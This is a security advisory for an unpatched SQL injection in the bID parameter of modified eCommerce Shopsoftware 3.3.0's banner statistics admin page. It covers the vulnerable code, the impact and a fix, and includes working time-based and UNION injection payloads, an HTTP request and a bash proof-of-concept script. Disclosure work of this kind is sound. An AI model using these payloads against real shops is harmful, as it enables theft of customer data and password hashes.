# Security Advisory: SQL Injection via bID Parameter in Banner Statistics

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** Medium
> **CVSS:** 6.5 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
> **CWE:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 contains a SQL Injection vulnerability in `admin/banner_statistics.php`. The GET parameter `bID` is interpolated directly into five separate SQL queries without casting to integer or applying `xtc_db_input()`. An authenticated admin can inject arbitrary SQL, enabling blind time-based extraction of the full database, including customer PII, password hashes, payment data, and configuration secrets.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: admin/banner_statistics.php | rev 16825 | None | Affected |
| Component: admin/includes/functions/html_graphs.php | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://www.modified-shop.org
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker)

---

## 3. Vulnerability Description

`admin/banner_statistics.php` uses `$_GET['bID']` in multiple SQL queries without any sanitization:

```php
// admin/banner_statistics.php:39
$banner_query = xtc_db_query(
  "SELECT banners_title FROM " . TABLE_BANNERS .
  " WHERE banners_id = '" . $_GET['bID'] . "'"
);

// admin/banner_statistics.php:43
$years_query = xtc_db_query(
  "SELECT DISTINCT year(banners_history_date) AS banner_year FROM " . TABLE_BANNERS_HISTORY .
  " WHERE banners_id = '" . $_GET['bID'] . "'"
);

// admin/banner_statistics.php:159,162,166 — via graph functions:
xtc_banner_graph_yearly($_GET['bID']);   // html_graphs.php:422: WHERE banners_id = '$banner_id'
xtc_banner_graph_monthly($_GET['bID']);  // html_graphs.php:476: WHERE banners_id = '$banner_id'
xtc_banner_graph_daily($_GET['bID']);    // html_graphs.php:533: WHERE banners_id = '$banner_id'
```

None of these calls wraps `$_GET['bID']` with `(int)`, `xtc_db_input()`, or any other sanitization. The parameter flows directly into string-quoted SQL context, enabling classic time-based blind injection.

### Necessary Conditions

- **Authentication:** Admin
- **User interaction:** None (GET request)
- **Attack vector:** Network

---

## 4. Impact

- **Confidentiality:** High — full database contents readable via blind extraction
- **Integrity:** None (SELECT queries only at these points)
- **Availability:** None

Extractable data includes: `customers` (email, phone, address, password hash), `orders` (purchase history), `configuration` (admin secrets, API keys stored in DB), and all other tables.

---

## 5. Classification

### CVSS

- **Score:** 6.5
- **Severity:** Medium
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | Low |
| User Interaction (UI) | None |
| Scope (S) | Unchanged |
| Confidentiality (C) | High |
| Integrity (I) | None |
| Availability (A) | None |

### CWE / CAPEC

- CWE-89 / CAPEC-66: SQL Injection

---

## 6. Exploitation Scenario

1. Attacker with admin credentials navigates to `admin/banner_statistics.php?bID=<PAYLOAD>`.
2. Payload `1' AND SLEEP(3)-- -` causes the page to delay 3 seconds, confirming injection.
3. Attacker uses sqlmap or manual extraction to dump the full database schema and data.
4. Customer PII, password hashes (bcrypt/MD5), and order history are exfiltrated.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): admin/banner_statistics.php:39,43,159,162,166
         admin/includes/functions/html_graphs.php:377,422,476,533
Parameter(s): bID (GET)
Method: GET
Authentication: Admin required
```

### Example Request (time-based blind confirmation)

```http
GET /admin/banner_statistics.php?bID=1'+AND+SLEEP(3)--+-&page=1 HTTP/1.1
Host: TARGET
Cookie: MODsid=<ADMIN_SESSION_ID>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```

### Observed Response

```text
HTTP response delayed by ≥ 3 seconds → time-based blind SQLi confirmed.
```

### UNION extraction (database version)

```
bID=0' UNION SELECT version()-- -
```

---

## 8. Proof of Concept

```bash
#!/bin/bash
# V22 PoC — SQL Injection via bID in banner_statistics.php
TARGET="${TARGET:-http://localhost:9080}"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

SID=$(curl -s -c /tmp/c_v22.txt -b /tmp/c_v22.txt -H "User-Agent: $UA" \
  -X POST "$TARGET/admin/login.php?action=process" \
  -d "username=admin%40shop.local&password=admin123&redirect=" \
  -D - -o /dev/null 2>/dev/null | grep -i "set-cookie.*MODsid" | \
  grep -oP '(?<=MODsid=)[^;]+' | head -1)

echo "[*] Session: $SID"

# Baseline response time
T0=$(date +%s%3N)
curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  "$TARGET/admin/banner_statistics.php?bID=1&page=1" -o /dev/null
T1=$(date +%s%3N)
BASELINE=$((T1-T0))
echo "[*] Baseline response time: ${BASELINE}ms"

# Time-based blind injection (expect ≥ 3s delay)
T0=$(date +%s%3N)
curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  --max-time 10 \
  "$TARGET/admin/banner_statistics.php?page=1" \
  --data-urlencode "bID=1' AND SLEEP(3)-- -" -G -o /dev/null
T1=$(date +%s%3N)
ELAPSED=$((T1-T0))
echo "[*] Injection response time: ${ELAPSED}ms"

if [ $ELAPSED -gt 2500 ]; then
  echo "[+] VULNERABLE: Time-based blind SQLi confirmed in banner_statistics.php"
  echo "[+] Delay: ${ELAPSED}ms (expected ≥ 3000ms)"
else
  echo "[-] No delay detected (elapsed: ${ELAPSED}ms)"
fi

# UNION-based extraction (db version)
echo ""
echo "[*] Attempting UNION-based version extraction..."
RESP=$(curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  "$TARGET/admin/banner_statistics.php?page=1" \
  --data-urlencode "bID=0' UNION SELECT version()-- -" -G)
VERSION=$(echo "$RESP" | grep -oP '(?<=<b>)[0-9]+\.[0-9]+[^<]+(?=</b>)')
[ -n "$VERSION" ] && echo "[+] DB version via UNION: $VERSION"
```

### Expected Result

```text
[+] VULNERABLE: Time-based blind SQLi confirmed in banner_statistics.php
[+] Delay: 3042ms (expected ≥ 3000ms)
```

---

## 9. Reproduction Steps

1. Log in as admin.
2. Navigate to `GET /admin/banner_statistics.php?bID=1'+AND+SLEEP(3)--+-&page=1`.
3. Response takes ≥ 3 seconds — time-based blind SQLi confirmed.
4. Use `bID=0' UNION SELECT version()-- -` for UNION extraction.

---

## 10. Mitigation

- Cast `bID` to integer before use: `$banner_id = (int)$_GET['bID'];`
- Apply the same fix in all callers, including `xtc_banner_graph_*` functions.

---

## 11. Fix

**No official fix as of 16/11/2026.**

```php
// admin/banner_statistics.php:38–44 — Vulnerable:
$banner_query = xtc_db_query("... WHERE banners_id = '" . $_GET['bID'] . "'");
$years_query  = xtc_db_query("... WHERE banners_id = '" . $_GET['bID'] . "'");

// Fixed:
$banner_id    = (int)$_GET['bID'];
$banner_query = xtc_db_query("... WHERE banners_id = '" . $banner_id . "'");
$years_query  = xtc_db_query("... WHERE banners_id = '" . $banner_id . "'");

// Same fix for graph function calls:
xtc_banner_graph_yearly($banner_id);
xtc_banner_graph_monthly($banner_id);
xtc_banner_graph_daily($banner_id);

// In html_graphs.php, also sanitize $banner_id inside each function:
function xtc_banner_graph_yearly($banner_id) {
  $banner_id = (int)$banner_id;
  ...
}
```

---

## 12. Detection

```text
Suspicious: admin/banner_statistics.php requests where bID contains quote or SQL keyword.
Access log grep: grep "banner_statistics.*bID=.*'" /var/log/apache2/access.log
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Identified via code review |
| 16/11/2026 | Confirmed: 5+ SQL queries use $_GET['bID'] without sanitization |
| 16/11/2026 | Advisory prepared |
| pending | Vendor notified |

---

## 14. Credits

- **Researcher:** vinniboy021 (@vinniboy021) / vinniboy021@gmail.com

---

## 15. References

- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- OWASP SQLi: https://owasp.org/www-community/attacks/SQL_Injection

---

## 16. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 17. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021/agent-cve-hunter
